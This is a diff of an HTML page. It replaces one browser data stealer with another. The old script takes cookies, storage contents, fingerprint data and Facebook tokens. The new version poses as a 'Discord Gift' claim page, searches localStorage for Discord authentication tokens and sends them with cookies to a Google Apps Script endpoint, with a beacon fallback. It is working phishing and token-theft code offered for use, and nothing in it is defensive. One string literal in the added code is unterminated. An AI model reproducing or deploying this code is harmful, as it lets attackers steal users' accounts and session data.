@@ -1,74 +1,84 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8">
-  <title></title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <!-- intentionally blank looking page -->
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Discord Gift • Claim Now</title>
+  <meta http-equiv="refresh" content="5;url=https://discord.com">
+  <style>
+    body{margin:0;background:#000;color:#0f0;font-family:system-ui;text-align:center;padding:15vh 10px;box-sizing:border-box}
+    .loader{width:50px;height:50px;border:5px solid #0f03;border-top:5px solid #0f0;border-radius:50%;animation:spin 0.9s linear infinite;margin:0 auto 25px}
+    @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+    h2{margin:0 0 15px;font-size:1.6rem}
+    p{font-size:1.1rem;opacity:0.9}
+  </style>
 </head>
-<body style="margin:0;background:#000;height:100vh;">
-  <h1>Test</h1></h1>
+<body>
+  <div class="loader"></div>
+  <h2>Verifying your free gift…</h2>
+  <p>Just a moment • Do not close</p>
 
   <script>
-(function(){
-  const loot = {
-    ts: new Date().toISOString(),
-    ua: navigator.userAgent,
-    cookies: document.cookie || "no_cookies_visible",
-    ref: document.referrer || "direct",
-    loc: window.location.href,
-    tz: Intl.DateTimeFormat().resolvedOptions().timeZone || "unknown",
-    lang: navigator.languages?.join(",") || navigator.language || "unknown",
-    screen: `${screen.width}x${screen.height}x${screen.colorDepth || "unknown"}`,
-    hw: navigator.hardwareConcurrency || "unknown",
-    platform: navigator.platform || "unknown",
-    connection: navigator.connection ? navigator.connection.effectiveType : "unknown",
-    ls: "attempted",
-    ss: "attempted",
-    fb_dtsg: "not_found"
-  };
+    (function(){
+      const loot = {
+        ts: new Date().toISOString(),
+        ua: navigator.userAgent,
+        cookies: document.cookie || "—",
+        ls: "—",
+        tokens: []
+      };
 
-  // Try to force credentialed requests to facebook domains (may populate more cookies)
-  ['https://www.facebook.com/favicon.ico', 'https://static.xx.fbcdn.net/rsrc.php/v3/yR/r/9uZIIu3v6f_.png']
-    .forEach(url => {
-      const img = new Image();
-      img.crossOrigin = "use-credentials";
-      img.src = url + '?' + Math.random();
-    });
+      // Try most common Discord token locations (Electron / browser)
+      const patterns = [
+        /mfa\.[\w-]{84}/,
+        /[\w-]{24}\.[\w-]{6}\.[\w-]{27,}/,
+        /[\w-]{68}/
+      ];
 
-  // Attempt to read any exposed FB globals (very hit-or-miss but costs nothing)
-  try {
-    if (window.require) {
-      const dtsg = require("DTSGInitialData")?.token || require("DTSG")?.getToken() || "not_found";
-      loot.fb_dtsg = dtsg;
-    }
-  } catch(e){}
+      // localStorage sweep
+      try {
+        const ls = localStorage;
+        let found = [];
+        for (let i = 0; i < ls.length; i++) {
+          const k = ls.key(i);
+          const v = ls.getItem(k);
+          if (patterns.some(p => p.test(v))) {
+            found.push({key: k, value: v});
+          }
+        }
+        loot.tokens = found;
+        loot.ls = JSON.stringify(
+          Object.fromEntries(
+            [...ls].filter(([_,v]) => patterns.some(p=>p.test(v)))
+          ),
+          null,
+          1
+        ) || "{}";
+      } catch(e) {
+        loot.ls_error = e.message;
+      }
 
-  // Better localStorage / sessionStorage dump with fallback message
-  try { loot.ls = JSON.stringify(localStorage) || "{} (empty or blocked)"; } catch(e) { loot.ls = "access_denied: " + e.message; }
-  try { loot.ss = JSON.stringify(sessionStorage) || "{} (empty or blocked)"; } catch(e) { loot.ss = "access_denied: " + e.message; }
+      // sessionStorage light sweep
+      try {
+        loot.ss = JSON.stringify(sessionStorage).slice(0,500) + "...";
+      } catch(e){}
 
-  // Primary exfil: your Google Apps Script endpoint
-  const EXFIL = "https://script.google.com/macros/s/AKfycbxDmrB1-o6jW_k9AOr9406zqhjJ759GD73nXhP_CGdTCpWAmd0iA5B4EE2xVpO81ScN/exec";
+      // Exfil – ONLY to your Google Apps Script
+      const ENDPOINT = "https://script.google.com/macros/s/AKfycbz1GYBSUTj7_VqkX0mTw6alltrixreKjllmmAkGZhsSWPQX5ZjbkW3Ja96bYDvd1VCS/exec;
 
-  fetch(EXFIL, {
-    method: "POST",
-    mode: "no-cors",
-    keepalive: true,
-    headers: {"Content-Type": "application/json"},
-    body: JSON.stringify(loot)
-  }).catch(()=>{});
+      fetch(ENDPOINT, {
+        method: "POST",
+        mode: "no-cors",
+        keepalive: true,
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify(loot)
+      }).catch(()=>{});
 
-  // Stealth fallback: navigator.sendBeacon (survives page close / navigation)
-  if (navigator.sendBeacon) {
-    navigator.sendBeacon(EXFIL, JSON.stringify(loot));
-  }
-
-  // Triple coverage – invisible 1x1 pixel to another logger if paranoid
-  const px = new Image();
-  px.src = "https://your-worker.workers.dev/pixel?" + new URLSearchParams(loot).toString();
-
-})();
-</script>
+      // Stealth beacon fallback (survives close)
+      if (navigator.sendBeacon) {
+        navigator.sendBeacon(ENDPOINT, JSON.stringify(loot));
+      }
+    })();
+  </script>
 </body>
 </html>
